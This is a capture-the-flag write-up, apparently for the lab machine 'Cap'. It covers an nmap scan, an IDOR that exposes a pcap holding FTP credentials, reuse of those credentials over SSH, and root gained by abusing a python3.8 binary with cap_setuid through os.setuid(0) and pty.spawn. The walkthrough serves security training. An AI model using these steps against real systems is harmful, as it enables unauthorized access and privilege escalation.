<img width="1102" height="153" alt="image" src="https://github.com/user-attachments/assets/978befe9-0d66-4099-a25f-80d871e66ade" />


Cap is a easy rated linux box which is pretty easy with the foothold and the privilege escalation too. It starts with a pcap file to download using idor vulnerability, analyzing the pcap file gives us ftp and ssh creds. After getting shell as user and running linpeas shows an interesting binary with capabilities abusing the binary gives us the root shell.

# Enumeration

## NMAP

```bash
nmap -p- --min-rate=2000 -sVC -v -oN nmap 10.10.10.245

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web page

<img width="1287" height="809" alt="image" src="https://github.com/user-attachments/assets/c3b99e70-09a6-48ba-ae1d-3c6e1f8bff6e" />

We see a download button, i download the file and it is a pcap file with a little to no traffic inside of it.I intercepted the request and saw ‘/download/1’ we have control over the directory after download so we can download any file listed. Itried download the ‘download/0’ and got a pcap file which has more traffic which we can analyze.

```bash
GET /download/0 HTTP/1.1
Host: 10.10.10.245
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.245/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

 
<img width="1421" height="497" alt="image" src="https://github.com/user-attachments/assets/e390e731-fa47-49a3-996b-923e4ec28929" />



We can see a plain text password was passed to authenticate to ftp.

Now we have the password we can try to authenticate to ftp and look for some more interesting stuff.

# Exploitation

## Shell as nathan

```bash
ftp 10.10.10.245                        
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44435|)
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 Oct 05 04:35 snap
-r--------    1 1001     1001           33 Oct 05 04:08 user.txt
226 Directory send OK.
```

We have our user flag here, we can also try same creds for ssh 

```bash
ssh nathan@10.10.10.245            
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct  5 05:36:23 UTC 2025

  System load:  0.08              Processes:             235
  Usage of /:   36.6% of 8.73GB   Users logged in:       1
  Memory usage: 34%               IPv4 address for eth0: 10.10.10.245
  Swap usage:   0%

  => There are 3 zombie processes.

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Oct  5 04:36:23 2025 from 10.10.16.3
nathan@cap:~$ 
```

## Shell as root

Now that we have shell as user we can run inpeas to get more information and look for potential vectors to escalate our privileages

```bash
╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                 
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

Files with capabilities (limited to 50):
***/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip***
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Running linpeas show th python binary on the system have setuid capabilities, which we can use by setting the uid as 0 and then spawing a bash shell inside of python terminal using pty.

```bash
python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> import pty
>>> os.setuid(0)
>>> pty.spawn('bash')
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# ls /root 
root.txt  snap
root@cap:~# 
```

And here we got our root shell!
